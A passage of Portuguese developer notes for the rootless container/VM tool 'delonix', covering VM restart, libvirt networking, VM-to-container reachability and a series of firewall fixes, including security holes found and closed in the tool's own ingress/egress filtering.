  `snapshot` (checkpoint) → `snapshots` lista → `restore` → limpo, sem domínios órfãos.
  Os default methods do trait (erro "not supported") são o mecanismo que dá ao CH o
  fail-closed de graça; só o libvirt faz override.

### `vm start`/`vm restart` (v0.12.0) — trazer de volta uma VM parada, sem redigitar as flags

Bug report real (o mesmo `dev` do achado acima): depois de o `vm console`
finalmente destrancar, o domínio afinal já estava mesmo `Stopped` (motivo fora
do alcance do delonix — ver secção anterior). A única forma de voltar a
arrancá-la era `delonix vm create dev` de novo, que É idempotente/auto-heal
(reaproveita o overlay), mas **exige as MESMAS flags** (`--vcpus`/`--memory`/
`--disk`/etc.) — sem elas, o "auto-heal" arrancaria com os defaults do clap
(1 vCPU, 1G), silenciosamente diferente da VM original. `vm start`/`vm
restart` (`delonix_vm::{start,restart}`, `crates/delonix-vm/src/lib.rs`)
resolvem isto: reconstroem a `VmConfig` a partir do PRÓPRIO registo persistido
(`config_from`) — disco base, vcpus, memória, rede, backend, `restart_policy`,
`devices`, e (só libvirt) o net mode, que `LibvirtBackend::boot` já guardava
disfarçado no campo `Vm.tap` (`cfg.net_mode.unwrap_or("user")`) — e delegam no
mesmo `create`/auto-heal de sempre.

**Limitação honesta, documentada no próprio `--help`**: o registo `Vm` nunca
persistiu tudo o que a `VmConfig` completa tem — kernel/initrd/firmware/
cmdline de boot directo, seed de cloud-init próprio, volumes 9p, IP estático,
VNC, e os campos avançados de libvirt (machine/cpu model/topology/TPM/video/
boot order/discos ou NICs extra/XML cru) só existiram como flags do `vm
create` e morrem depois de ele terminar. Uma VM que precise de algum destes
tem de voltar pelo `vm create` original (também idempotente) — `start`/
`restart` cobrem o caso comum (imagem dourada, sem flags avançadas), não
substituem `create` para o resto. `vm start` é idempotente (já a correr = sem
efeito, delega no `create`); `vm restart` força sempre um reboot real (pára
primeiro se estiver a correr).

## Rede das VMs libvirt — default `nat` com IP, `--ip` estático, rotas VM↔container

Bug report real: `vm create dev` mostrava `IP <none>` para sempre — sem
`--net-mode` e rootless, o backend libvirt caía em `qemu:///session` user-mode
(SLIRP), cujo IP é invisível ao `domifaddr` e inalcançável. Corrigido:

- **Default inteligente** (`LibvirtBackend::boot`): sem `--net-mode`, se a
  conexão de SISTEMA é utilizável (`system_libvirt_usable`, grupo `libvirt`),
  o modo efectivo passa a **`nat`** → IP por DHCP da rede libvirt, visível e
  alcançável. Só sem acesso ao system fica user-mode, e o `create` AVISA alto
  ("no reachable IP — join the `libvirt` group…"). `Vm.tap` passou a registar o
  **modo efectivo** (`nat`/`bridge`/`user`) — é o que o `wait_for_boot` usa
  para distinguir "esperar o lease DHCP" de "nunca vai ter IP" (antes desistia
  aos 3s para QUALQUER VM libvirt, mesmo nat a meio do boot).
- **`--ip <estático>`** (`vm create` + `spec.ip` no manifesto): reserva DHCP
  MAC→IP na rede libvirt (`virsh net-update … ip-dhcp-host`, `libvirt_reserve_ip`,
  idempotente add-last→modify). Só modo nat; noutros modos erro claro. Armadilha
  de argv: os flags `--live --config` têm de vir ANTES do `--` (depois viram
  dados posicionais). **Limitação**: `vm rm` ainda não remove a reserva.
- **`<backingStore>` explícito no XML do domínio**: o perfil AppArmor
  por-domínio (virt-aa-helper, Ubuntu) só whitelista caminhos presentes no XML
  — sem ele o QEMU abria o overlay mas levava EPERM no qcow2 base
  ("Could not open …vm-images/…: Permission denied"). Formato via
  `disk_backing_format` (nunca pela extensão).
- **DNS interno**: `dns_resolve` agora resolve VMs pelo **IP do registo**
  primeiro (uma VM nat/bridge vive na virbr0 do HOST — o MAC nunca aparece na
  neigh do holder, único mecanismo anterior), com neigh como fallback (CH).
  `delonix_vm::status` **persiste** o IP recém-aprendido (o lease DHCP chega
  muito depois do create). NOTA: o DNS corre no processo do holder — binário
  antigo só apanha isto num respawn do holder (não forçar num host com
  containers vivos).
- **Matriz de alcançabilidade validada ao vivo** (kaeso-sys-01, VM nat
  192.168.122.x + containers SDN 10.210.x): **container→VM funciona
  nativamente** (container → holder → slirp → stack do host → virbr0; provado
  com banner SSH recebido de dentro do kaeso-odoo) e as regras de EGRESS
  por-container governam-no (daddr CIDR). **VM→container**: por porta publicada
  ligada ao gateway da rede da VM, ou pelo proxy L7. IPs de container DIRECTOS
  são inalcançáveis de fora do netns do holder (NAT do slirp) — juntar as duas
  casas (virbr0 do host ↔ SDN no netns do holder) exige `CAP_NET_ADMIN` no
  init-netns do host (um veth+rotas privilegiado), fora do modelo rootless;
  trabalho futuro opt-in (`delonixd`), NÃO um toggle (o `delonix0` não é bridge
  de host — confirmado). VM↔VM na mesma rede nat: directo pela virbr0. IP do
  ingress (SDN) para VM = backend Cloud Hypervisor (tap no holder, MESMA SDN dos
  containers → alcança-os por IP directo; provado por construção, mas a golden
  image k8s só arranca em libvirt, não em CH).

### `delonix vm reach` — descoberta VM→container (sem dataplane novo)

O caminho VM→container por **porta publicada** só funciona se o bind for um
endereço que a VM roteia — o **gateway da rede libvirt** (ex.: `192.168.122.1`),
não o loopback (o default SEGURO, que faz o VM→container falhar em silêncio com
"connection refused"). O mecanismo já existia (`DELONIX_PUBLISH_ADDR=<gw>` no
`slirp_add_hostfwd`, IPv4 validado); ligar ao gateway do libvirt expõe às VMs
dessa rede **mas não à LAN externa** (192.168.122/24 é NAT). **Provado E2E**: de
dentro de uma VM (`ubuntu@192.168.122.50`), `curl 192.168.122.1:<porta>` →
HTTP 200 para um container na SDN; o loopback-bound recusa, como esperado.

`delonix vm reach` (`cmd/vm.rs`, `cmd_reach`) torna isto descobrível: lista os
gateways `virbr*` (`parse_ip_gateways`), lê o bind VIVO de cada porta publicada
via `ss -tlnH` (`parse_ss_binds` — o bind NÃO está no registo, veio do env var
no publish), e separa "alcançáveis a partir de VMs" (endereço:porta) dos
"loopback-only" (com o comando exacto de correção: `unpublish` + republish com
`DELONIX_PUBLISH_ADDR=<gw>`). Read-only, zero privilégio, zero mudança ao default
seguro. Parsers puros e testados (`parse_ip_gateways_pega_so_as_virbr`,
`parse_ss_binds_classifica_loopback_vs_gateway`).

## VM↔container por IP directo (`vm bridge`) — EXPERIMENTAL, privilegiado, opt-in

A ÚNICA coisa que o modelo rootless não faz sozinho: dar a uma VM libvirt (em
`virbr0`, netns do host) alcançabilidade DIRECTA aos IPs de container da SDN
(`delonix0`/`dlxn…`, dentro do netns do holder `unshare --user --net`). Fechar a
fronteira exige `CAP_NET_ADMIN` no init-netns do host, logo `vm bridge` **precisa
de root** — é a excepção deliberada ao daemonless-rootless, atrás de `--apply`
(default = DRY-RUN que só imprime o plano). Módulo `cmd/vmbridge.rs`.

- **Mecanismo** (`bridge_plan`, puro/testado): veth par no host → move a ponta SDN
  para o netns do holder + enslave à bridge da rede → ponta host ganha
  `<prefix>.255.254/16` → `ip_forward=1` → rota de retorno `<vm-subnet> via
  <host-ip>` DENTRO do holder. Sem SNAT: o container vê o IP real da VM, e o
  firewall por-container continua a governar (um IP de VM não está em `@dlxall`,
  passa como gateway; regras `ingress` explícitas aplicam-se na mesma).
- **Segurança**: abre VM↔container só na rede indicada; a subnet da VM é a NAT do
  libvirt (`192.168.122.0/24`), NÃO a LAN externa. `vm unbridge <rede>` desfaz.
- **Robustez**: regras `iptables -I FORWARD` ACCEPT nos dois sentidos
  (`<vm-subnet>↔<sdn>/16`) contra o REJECT default do libvirt; establish
  IDEMPOTENTE (limpa um veth órfão antes de criar, p.ex. após respawn do holder).
- **VALIDADO E2E ao vivo** (kaeso-sys-01, 2026-07-21): de DENTRO de uma VM libvirt
  (`ubuntu@192.168.122.50`) → `ping`/`curl` a um container da `kaeso-net` por IP
  DIRECTO (`10.210.37.150:8069` → HTTP 200, ttl=63 = uma hop pelo forward do
  host). O `unbridge` limpa tudo. Três bugs reais apanhados no host e corrigidos:
  (1) sob sudo resolvia o state do root, não do utilizador (`adopt_invoking_user_root`
  via `$SUDO_USER`); (2) `nsenter -U -n` largava as caps → EPERM no enslave, tem
  de ser `-n` só (root mantém o CAP_NET_ADMIN do init-userns sobre o netns do
  userns descendente); (3) IPs de container são dinâmicos (DHCP, mudam no restart).
- **Follow-ups**: persistência (re-aplicar num respawn do holder) e **descoberta
  por NOME** (a VM resolver `<c>.<ns>.delonix.internal` via o DNS do holder, para
  não depender de IPs dinâmicos) — a fatia que dá o valor real. Complementa o
  `vm reach` (via porta publicada, sem privilégio) para quem precisa do IP 10.x cru.

## Firewall `ingress`/`egress` — o último comando ganha (+ `rm` cirúrgico)

Bug report real: `ingress deny <c> 8069` seguido de `ingress allow <c> 8069`
deixava o serviço bloqueado PARA SEMPRE — as regras acumulavam no `ContainerFw`
e a chain nft é first-match terminal, logo o deny antigo (acima) ganhava. Fixado
em `cmd/firewall.rs::add_rule` (semântica ufw): uma regra nova para o MESMO
match (dir/proto/porta/origem, com `""`≡`0.0.0.0/0`≡`*` via `norm_any`)
**substitui** a existente, com nota no output. Para sobreposições parciais (ex.:
`deny any/8069` vs `allow tcp/8069`, matches distintos) um **aviso de sombra**
(`field_overlaps`) explica que a regra anterior continua a casar primeiro e diz
o comando para a tirar. Novo **`ingress|egress rm <c> <[proto/]porta> [--from/
--to]`** — remoção cirúrgica em que os coringas do spec são FILTRO (`rm c 8069`
tira tcp/udp/any dessa porta); complementa o `clear` (tudo-ou-nada) e segue a
sua regra de "firewall vazia desaparece por inteiro". Também corrigido:
`ingress unpublish` num container PARADO sem rede custom — o hostfwd vive no
slirp por-container, que morreu com ele; limpa-se só o registo (antes: erro
"container is not running" e o publish ficava preso). Validado E2E ao vivo
(deny→000, allow→200 com substituição, rm→limpo). Nota: um `ingress -h` vazio
reportado uma vez NÃO reproduziu (3× OK) — glitch de terminal, sem causa no CLI.

### Revisão do flow `-p` ↔ `ingress`/`egress` (2026-07-27) — 1 bug de SEGURANÇA + 3 de coerência

Bug report real do utilizador: "o browser não deve bloquear quando o container é exposto via `-p`".
A investigação partiu do sintoma e acabou noutro sítio — o sintoma era real, mas o achado grave
estava ao lado. Os quatro problemas partilham a mesma raiz conceptual: **`-p` (publish) e
`ingress`/`egress` (firewall) são dois planos independentes que ninguém reconciliava**, nem no
dataplane nem no que a CLI dizia ao utilizador.

1. **CRÍTICO (segurança) — a PORTA era silenciosamente ignorada quando o proto era `any`.**
   `fw_chain_body` (`delonix-net/src/infra.rs`) só emitia o `dport` DENTRO do ramo
   `proto != "any"`. Como `parse_port_spec` faz `proto` cair em `any` sempre que o utilizador
   escreve uma porta nua (`allow <c> 9999`, a forma esmagadoramente comum), a regra gerada era
   `ip daddr <ip> accept` — **o container inteiro**, não a porta pedida. Consequência medida ao
   vivo, não teórica: com `policy deny`, um `ingress allow <c> 9999` (porta sem relação nenhuma)
   ABRIU a porta 18099 publicada; com `policy allow`, um `ingress deny <c> 9999` FECHOU-a. O
   comando fazia o oposto do que dizia, exactamente onde estar errado é um buraco de segurança.
   Com proto explícito (`tcp/9999`) sempre funcionou — é por isso que nunca apareceu nos testes
   E2E anteriores, que usam a forma com proto. **Corrigido**: `any` + porta passa a emitir
   `meta l4proto { tcp, udp } th dport <porta>` (`th` = transport header, válido para os dois,
   ranges `n-m` incluídos — o `fw_port_ok` já os valida). Regressão em
   `fw_body_keeps_the_port_when_proto_is_any`. **Provado por teste unitário, NÃO ao vivo**:
   `fw_chain_body` corre dentro do processo do HOLDER, e este host tem containers vivos (odoo,
   registries, control-planes k8s) — respawnar o holder derrubaria a SDN de todos (mesma nota
   já registada para o DNS interno). Só apanha o fix num respawn do holder.
2. **`ingress ls` mentia sobre as portas publicadas.** A tabela imprimia sempre
   `publish <spec> 0.0.0.0/0 allow DNAT`, incondicionalmente. Reproduzido ao vivo: com
   `policy deny`, `curl` dava `000` e a tabela continuava a dizer `allow` — na coluna que se lê
   precisamente para decidir se algo está exposto. **Corrigido** com `published_verdict`, que
   resolve o veredicto como o dataplane o resolve, e imprime `BLOCKED` + o comando exacto de
   recuperação. `set_policy` ganhou o mesmo aviso no momento em que o `deny` é aplicado.
3. **A porta que uma regra tem de nomear é a do CONTAINER, nunca a do host** — o DNAT corre no
   `prerouting`, logo quando o pacote chega à chain por-container o `dport` já é o `cp` de
   `hp:cp`. Não estava documentado em lado nenhum e é contra-intuitivo (o `ls` mostra `18099:80`,
   a regra tem de dizer `80`). Antes do fix #1 isto nem se notava: com `proto: any` a regra
   ignorava a porta e "funcionava" por acidente, pela razão errada. Agora as mensagens de aviso
   dizem-no explicitamente.
4. **`net ingress ls` listava containers que a firewall provavelmente não governa.** Um
   `--net host`/`none` aparecia com `allow (default)`, que se lê como "governado e aberto",
   quando `require_sdn_ip` recusa QUALQUER mutação de firewall para ele (`ingress allow
   mandume-benguela-02 80` → erro). Passou a `n/a (host net)`.

**O sintoma original (o browser) era o comportamento seguro por omissão, sem superfície de CLI.**
`slirp_add_hostfwd` liga sempre a `127.0.0.1` — correcto por omissão, mas a ÚNICA forma de o
alargar era a env var não documentada `DELONIX_PUBLISH_ADDR`, e `parse_publish` REJEITAVA a
sintaxe Docker `-p <ip>:<hp>:<cp>` como "invalid port". Um browser noutra máquina (ou o próprio
host pelo IP da LAN) recebia connection-refused sem nada a explicar porquê. **Corrigido**:
`parse_publish_addr` lê a forma `[hostIp:]hostPort:contPort[/proto]` e `publish_bind_addr`
concentra a precedência (spec > env > `127.0.0.1`) num só sítio, para os DOIS caminhos de publish
(slirp por-container e o slirp único do ingress) não divergirem. O default seguro fica intacto —
alargar é sempre opt-in explícito. Só IPv4 (é interpolado no JSON do api-socket do slirp; um
literal IPv6 também colidiria com a divisão por `:`); um head não-IPv4 é **recusado**, nunca
descartado em silêncio — que foi exactamente o bug do compose com `127.0.0.1:9000:80`.
**Validado ao vivo**: `-p 0.0.0.0:18099:80` → `ss` confirma bind em `0.0.0.0`, e
`curl http://192.168.1.106:18099/` → **200** (antes: spec recusada; com `8080:80`, `000` na LAN).

**Dívida registada aqui e FECHADA a 2026-07-28** (ver "Endurecimento do ingress/egress" abaixo):
`infra::publish_port_allow` (publish com allowlist de CIDRs ANTES do DNAT) tinha **zero
chamadores** — a mesma família de armadilha de `mount_live`/`set_net_rate`/`update_limits`. Foi
**apagado**, não ligado: o tráfego publicado chega todo com o gateway do slirp como origem, por
isso a allowlist não casaria com nada e o `!= { … } drop` teria dropado TUDO.

### `-p 80:80` respondia com o JSON cru do slirp (2026-07-27)

Bug report real: `container run --rm -p 80:80 nginx` →
``system call `slirp hostfwd` failed: port 80: {"error":{"desc":"bad request: add_hostfwd:
slirp_add_hostfwd failed"}}``. **Não é bug de dataplane** — o `add_hostfwd` do slirp faz o bind do
lado do HOST, como este mesmo utilizador não privilegiado, e uma porta abaixo de
`net.ipv4.ip_unprivileged_port_start` (1024) precisa de `CAP_NET_BIND_SERVICE`. A limitação já
estava documentada (é a razão de as auto-rotas do proxy L7 servirem em `:8080`), mas o utilizador
recebia JSON opaco **depois** do container já estar criado.

- **Preflight no `cmd_run`**, ao lado do erro de porta ocupada e no mesmo formato (facto primeiro,
  depois os comandos prontos a copiar: `-p 8080:80`, ou `sysctl -w ip_unprivileged_port_start=80`).
  Falha antes de criar seja o que for.
- **`delonix_net::can_bind_host_port`** decide por um **bind real**, não por comparação com o
  sysctl: o sysctl não é a regra toda (um binário com `CAP_NET_BIND_SERVICE` liga a 80 com ele
  intocado). `EADDRINUSE` **não** conta como falha — porta ocupada é outro diagnóstico, com erro
  próprio que nomeia o dono, e este check não lho pode roubar (coberto por teste).
- `slirp_add_hostfwd` passou a acrescentar a mesma explicação à mensagem quando a porta é
  privilegiada — os caminhos que não fazem preflight (ingress, compose, `container update
  --publish-add`, a API docker) aterram todos ali.

Validado ao vivo em EN e PT. Nota de teste: um `run` falhado com `--rm` deixou um `slirp4netns`
órfão a segurar a porta (o caso conhecido do `reap_orphan_slirp`, reapado no `run` seguinte) —
limpo à mão nesta sessão.

**Onde é que o utilizador baixa o limiar (decisão fechada, 2026-07-28).** O `install.sh --low-ports`
(commit `ec8f079`) já escrevia `/etc/sysctl.d/99-delonix-lowports.conf` — o que faltava era ser
DESCOBRÍVEL: não estava no `README.rst` (só nas notas da v0.36.1) e o erro acima mandava um `sysctl
-w` avulso, que não sobrevive ao reboot. Corrigido nos dois sítios (o erro aponta agora para o
instalador com a flag). **O default público mantém-se opt-in** — baixar a fronteira num host
partilhado/de produção deixa qualquer programa local ligar-se a 80-1023, e a alternativa que não
baixa nada é um proxy root na 80 a reencaminhar para uma porta alta.

**A golden VM rootless (`--no-k8s`) é a excepção e traz o sysctl JÁ aplicado**
(`rootless_customization_steps`): é uma VM descartável, de um só inquilino, cujo propósito inteiro
é correr Delonix rootless — o compromisso host-wide não tem ali significado. **A golden k8s NÃO o
leva** (o kubelet/kube-proxy desse nó já correm como root); por isso o passo fica no
`rootless_customization_steps` e não no `shared_account_steps`. Escrito como FICHEIRO em
`/etc/sysctl.d`, nunca `sysctl -w`: o `virt-customize` corre contra um convidado offline, só o que
fica em disco chega ao primeiro boot. Teste:
`so_a_golden_rootless_traz_as_portas_baixas_abertas` (as 3 distros levam-no, a golden k8s não).

### Varredura #2 do flow de comunicação (2026-07-27) — o IP primário como ponto cego

Continuação directa da revisão acima, a pedido do utilizador ("há mais algum bug de comunicação?").
Quatro achados novos, todos **reproduzidos ao vivo**. Três partilham UMA raiz: **todo o plano de
controlo assume que um container tem UM IP**. Multi-homing (`--net-connect`) dá-lhe um segundo, e
esse segundo é invisível para tudo o que devia governá-lo.

1. **ALTO (segurança) — a firewall por-container não governa as redes adicionais.**
   `apply_firewall(id, ip, fw)` recebia só `c.ip` e os jumps no `fwdeny` são
   `ip daddr <ip> jump fw<hash>` — o IP extra não tem jump nenhum, logo nunca entra na chain.
   **Ao vivo**: `ingress policy deny` em B → A→B pelo IP primário `blocked`; ligados os dois a uma
   2.ª rede, A→B pelo IP extra **REACHABLE**. `ingress`/`egress`/`Dependency` são todos
   contornáveis por multi-homing. **Corrigido** com `apply_firewall_all` (linha de controlo
   `firewall <id> <ip1,ip2,…> <hex>`) + `do_firewall` a emitir um corpo por IP e um par de jumps
   por IP. Com um só IP a linha fica byte-a-byte igual à antiga — um holder anterior continua a
   servir o caso single-homed, só a forma multi-IP exige o novo.
2. **ALTO (segurança) — o isolamento de namespace também é contornável por multi-homing.**
   `do_attach_extra` nunca chamava `ns_set_join`, ao contrário do `do_attach`: o IP extra fica
   fora de `@dlxall`/`@dlxns_<ns>`, e a regra de corte cross-namespace
   (`ip saddr @dlxall ct state new drop`) só dispara para fontes em `@dlxall`. **Ao vivo**:
   teamA↔teamB `blocked` pelos IPs primários, **REACHABLE** pelos extra. **Corrigido**: a linha
   `attach-extra` ganhou o token de namespace (6 tokens = `default`, 7 = namespaced — o mesmo
   padrão de compatibilidade que o `attach` já usava) e chama `ns_set_join`.
   **Corolário corrigido de caminho**: os jumps do `fwdeny` passaram a ser **reconstruídos** (não
   adicionados-se-faltarem). Um container que SAI de uma rede adicional deixava lá o jump do IP
   libertado, e o IPAM entrega esse IP a outro container mais tarde — o inquilino seguinte
   herdava em silêncio a firewall deste. `--net-connect`/`--net-disconnect` reaplicam agora a
   firewall.
3. **MÉDIO — as redes adicionais desapareciam num `stop`+`start`, em silêncio.** `cmd_start`
   reatacha só a rede primária; `c.extra_networks` está persistido mas nunca era reproduzido.
   **Ao vivo**: `eth1` presente antes, ausente depois, e o `describe` continuava a listar
   `Extra: dlx-dev2 (10.239.x on eth1)`. Um serviço alcançável só por essa 2.ª rede partia no
   primeiro restart, sem uma linha de aviso. É a MESMA família do `-v` que não era persistido
   (ver `cluster load`, acima) — mas ao contrário desse, aqui o estado ESTAVA guardado: faltava
   quem o replicasse. **Corrigido**: `cmd_start` reatacha cada `ExtraNet` (mesmo `id` no IPAM, por
   isso o IP volta igual; se voltar diferente, o registo é corrigido em vez de ficar a apontar
   para um endereço que já não existe). **Validado ao vivo**: `eth1` com o MESMO IP depois do
   restart.
4. **MÉDIO — o `unpublish` era cego ao protocolo, o `publish` não.** `-p 53:53/tcp` e
   `-p 53:53/udp` coexistem como duas publicações distintas, mas `slirp_remove_hostfwd` casava só
   por `host_port` e `do_unpublish` usava o needle `dport <n> ` — os dois derrubavam TUDO. Pior,
   `unpublish_live` removia UMA entrada do registo. **Ao vivo**: `--publish-rm 18100` deixou o
   registo a dizer `18100:53/tcp` com **zero** bindings no `ss` e `curl` a dar `000` — o registo a
   mentir sobre o dataplane, e a porta a ficar reservada no `port_owner` para um container que já
   não a serve. **Corrigido**: `slirp_remove_hostfwd_proto`/`do_unpublish(port, proto)`/
   `unpublish_port_proto` e o `unpublish_live` a remover TODAS as entradas daquele host port.
   **Validado ao vivo**: registo e `ss` passam ambos a vazio. (A forma de 2 tokens fica idêntica
   para o teardown, por compatibilidade com um holder anterior.)

**A lição transversal, que vale mais do que os quatro bugs**: `c.ip` não é "o endereço do
container" — é "o endereço na rede primária". Sempre que uma função de rede receber um único IP
vindo do registo, perguntar o que acontece com `extra_networks` não vazio. É a mesma classe da
armadilha já documentada do `container.userns` ("não é 'está num userns diferente do meu'") e do
`status()` por pidfile ("não é 'o holder é alcançável'").

**Nota de validação, importante para quem continuar**: os achados 1, 2 e metade do 4 corrigem
código que corre DENTRO do holder (`do_firewall`/`do_attach_extra`/`do_unpublish`). Este host tem
containers vivos (odoo, registries, control-planes k8s) e respawnar o holder derrubaria a SDN de
todos — por isso **os bugs foram provados ao vivo, mas as correcções desses três estão provadas
por teste unitário e leitura, não ao vivo**. Só tomam efeito num respawn do holder. Os achados 3 e
o lado-CLI do 4 correm no processo da CLI e estão validados ao vivo de ponta a ponta.

### Endurecimento do ingress/egress (2026-07-28) — o `policy deny` estava partido nos dois sentidos

Pedido: tornar o ingress/egress maduro ao nível do Docker/Podman. A revisão começou por uma
avaliação e acabou em correcções, porque o primeiro achado invalidava o subsistema inteiro.
**Todos os achados foram reproduzidos ao vivo primeiro, e todas as correcções validadas ao vivo
depois** (o holder estava DOWN com refcount 0 e sem redes — foi possível respawná-lo com o binário
novo sem derrubar nada, ao contrário das sessões anteriores).

1. **CRÍTICO — `policy deny` matava o tráfego legítimo, nos dois sentidos.** `ingress policy deny`
   tirava a saída ao PRÓPRIO container (DNS incluído); `egress policy deny` deixava um serviço
   publicado sem resposta (`curl` 200 → 000). Causa única: a política default emitia um
   `ip daddr <ip> drop`/`ip saddr <ip> drop` **sem `ct state`**, numa chain pendurada em
   `forward priority -10` — ANTES do `ct state established,related accept` do `forward`
   (priority 0). O tráfego de retorno nunca chegava a ver o accept. O isolamento de namespace, ao
   lado, já fazia a coisa certa (`ct state new drop`) — só a política ficou de fora. Consequência:
   "default-deny + allow explícito", a razão de existir do subsistema, era inexprimível.
   **Corrigido** com `fw_chain_prologue` (emitido UMA vez por chain, não por IP — o estado é do
   fluxo, não do endereço): `ct state invalid drop` + `ct state established,related accept`.
   **Efeito colateral a saber**: um `deny` explícito deixa de derrubar um fluxo JÁ estabelecido, só
   impede novos — é o que o iptables/nft/NetworkPolicy do k8s fazem, e é para isso que o
   `conntrack` (já uma dependência do instalador) existe. Validado ao vivo: com `ingress policy
   deny` a saída funciona E uma ligação nova de entrada continua bloqueada; com `egress policy
   deny` o publicado responde E a saída continua bloqueada.
2. **A aplicação da firewall não era atómica.** `do_firewall` era uma sequência de invocações
   separadas do `nft` (add chain → list → N× delete rule → 2×IPs add rule → e só então o
   flush+corpo). Cada uma é uma transação do kernel, por isso **entre apagar os jumps antigos e
   pôr os novos o container ficava sem firewall nenhuma** — janela aberta por qualquer
   `ingress deny`/`--net-connect`. Passou a **um único script `nft -f`**: o kernel aplica-o
   atomicamente e um erro de sintaxe deixa o ruleset anterior intacto em vez de meio-aplicado.
3. **Dispatch linear → verdict map.** O `fwdeny` levava **2 regras de jump por IP por container**;
   com os 49 containers que este host já teve, cada pacote percorria ~100 regras antes de chegar à
   sua. Agora há um `map fwmap { type ipv4_addr : verdict }` e uma chain própria **`fwcont`**
   (priority -5) com exactamente 2 regras (`ip daddr vmap @fwmap` / `ip saddr vmap @fwmap`),
   independentemente do número de containers. **A chain própria não é cosmética**: pôr as regras de
   dispatch no `fwdeny` deixaria a sua ordem relativa às regras de egress por-rede a depender da
   ORDEM DOS EVENTOS (que comando correu primeiro), não da intenção. Separadas, a política de
   egress da rede corre primeiro e continua autoritativa, e as regras por-container aplicam-se
   dentro dela (um `accept` não é terminal entre base chains, por isso um accept de rede nunca
   contorna a firewall do container). Confirmado ao vivo no `nft list chain ip dlxing fwcont`.
4. **`counter` em TODAS as regras + colunas PACKETS/BYTES no `ls`.** Não havia forma de responder a
   "esta regra alguma vez casou?" — metade do que uma firewall serve para dizer. `fw_rule_tail`
   (novo) é partilhado pelo GERADOR e pelo LEITOR: o tail é idêntico em todos os endereços de um
   container multi-homed, o que é exactamente o que permite somar os counters de uma regra ao longo
   das redes. Se os dois tivessem cópias próprias da formatação, o leitor deixava de casar em
   silêncio no dia em que o gerador mudasse um espaço. Validado ao vivo (`2 packets / 88 B` reais).
5. **IPv6 era uma armadilha, agora é recusa clara.** `fw_src_ok` aceitava CIDR v6 mas o dataplane é
   `table ip` (v4): o utilizador levava um dump cru do nft vindo do fundo do holder. Validador
   apertado para IPv4 + `check_cidr` (um só sítio para todos os pontos de entrada) a nomear o IPv6
   explicitamente. Suporte v6 a sério é tabela `inet` + SDN v6 — trabalho próprio, não um
   relaxamento de validador.
6. **Ranges de portas** (`-p 8000-8002:9000-9002`, sintaxe Docker) via `expand_publish_range`, que
   expande **na fronteira** — tudo a jusante (posse da porta, `unpublish`, o `ports` do registo)
   continua a ser por-porta-única, e é assim que deve ficar. Larguras diferentes são **recusadas**
   com a contagem dos dois lados, nunca truncadas em silêncio. Ligado ao `run` E ao
   `update --publish-add` (uma flag que funciona num sítio e não no outro é pior que nenhuma).
   Também apanhado: porta `0` e `70000` passavam no teste "só dígitos".
7. **`publish_port_allow`/`do_publish_allow`/`publish-allow` REMOVIDOS.** Zero chamadores desde
   sempre — e não podiam funcionar: todo o tráfego que chega por uma porta publicada traz o
   **gateway do slirp** como origem, por isso uma allowlist de CIDRs reais não casaria com nada e o
   `!= { … } drop` antes do DNAT teria dropado TUDO. Era a armadilha que esta base de código já
   levou três vezes (`mount_live`, `set_net_rate`, `update_limits`): pública, morta, a mutar estado
   partilhado, com o bug latente à espera do primeiro chamador.

**`delonix_net::SLIRP_GW` (`10.0.2.2`) — e a correcção de uma conclusão larga demais.** A primeira
medição desta sessão (cliente em `127.0.0.1`) viu `10.0.2.2` no log do nginx e daí concluiu-se que
o IP de origem NUNCA sobrevive ao hostfwd. **Errado, e corrigido no mesmo dia com três clientes em
vez de um**: `127.0.0.1` → `10.0.2.2`, mas `172.16.31.103` (LAN) e `192.168.122.1` (gateway
libvirt) chegam ao container **como eles próprios**. A libslirp não pode usar um endereço de
loopback como origem dentro da rede emulada — não há rota de volta — por isso substitui-o pelo
gateway; toda a origem roteável passa intacta. **Lição de método**: um único cliente de teste não
caracteriza um caminho de rede, e o cliente mais à mão (`localhost`) é precisamente o caso especial.

Consequências, todas confirmadas ao vivo: **a filtragem por origem FUNCIONA em portas publicadas**
(`policy deny` + `allow <porta> --from <cidr>` → origem permitida 200, outra origem 000), e o
rate-limit por-origem do `do_l4guard` separa clientes reais. A única excepção é o cliente loopback,
que não casa com uma regra escrita para um endereço real — o que importa saber é que testar uma
regra dessas com `curl localhost` falha por uma razão que nada tem que ver com a regra.

Três coisas ficaram erradas com o modelo correcto e foram corrigidas: (1) o `ingress ls` mostrava
`-` nos counters de uma regra `--from <ip>/32` com tráfego real — o kernel renderiza um prefixo de
host único como endereço nu, por isso o `/32` gerado nunca casava com a listagem; `fw_rule_tail`
passa a omiti-lo; (2) `published_verdict` (booleano) dizia **BLOCKED** a um publish restrito a uma
origem, com um aviso a afirmar "the port answers nothing" — falso exactamente na configuração mais
útil que existe (expor uma porta a uma só rede); passou a `published_reach` com três estados
(`Open`/`Sources`/`Blocked`); (3) a coluna FROM do publish, que esta sessão tinha acabado de mudar
para `10.0.2.2`, passou a mostrar as origens reais autorizadas, com a ressalva do loopback na nota.

E **`publish_port_allow` continua removido, mas por outra razão**: não é impossível, é
**redundante** — a chain por-container já faz filtragem por origem e fá-la bem. Dois mecanismos
paralelos para o mesmo trabalho, em chains diferentes com precedências diferentes, é como duas
respostas à mesma pergunta começam a divergir.

**Também continua em aberto** (não tocado nesta sessão): o `l4guard` só é alcançável por manifesto
(sem comando de CLI) e só é global; regras sem ordenação/prioridade explícita; sem `log prefix` por
regra. (Pods e VMs entraram no isolamento na v0.40.0 e a recuperação pós-respawn cobre pods
desde a v0.41.0 — ver a secção «Isolamento de namespace».)

### Bloco 0 do plano 33 (v0.37.1) — o caminho IPv6 não filtrado

Discovery da Fase 0 em `docs/discovery/33_GAPS_ENCONTRADOS.md`; notas em
`docs/releases/v0.37.1.md`. Este bloco existe porque o discovery encontrou um contorno
COMPLETO do modelo de política, e nenhum outro trabalho fazia sentido antes de o fechar.

**A SDN atribuía IPv6 ULA a cada container (`fd00:<o2>::<o3>:<o4>`, derivado do IPv4) e
a firewall inteira é `table ip`.** Segundo caminho de dados, zero política. Reproduzido
ao vivo: com a firewall a NEGAR em IPv4, o mesmo alvo respondeu 200 na porta 80 pela
ULA. Contornava `ingress`/`egress`, `policy deny`, isolamento de namespace,
`kind: Dependency` e o guarda L4 — todos `table ip`. Sem privilégio, e descobrível com
um `ping -6 ff02::1%eth0` (enumera todos os vizinhos da bridge numa passagem).

**Corrigido com DUAS camadas independentes, de propósito**: (1) `disable_ipv6` dentro do
netns do container no `attach` — tira a ULA *e* o link-local, sem depender de nada do
host; (2) `table ip6 dlxing` com `forward policy drop` no holder — apanha um container
PRIVILEGIADO que remonte `/proc/sys` rw e volte a ligar o v6. A camada 2 depende de
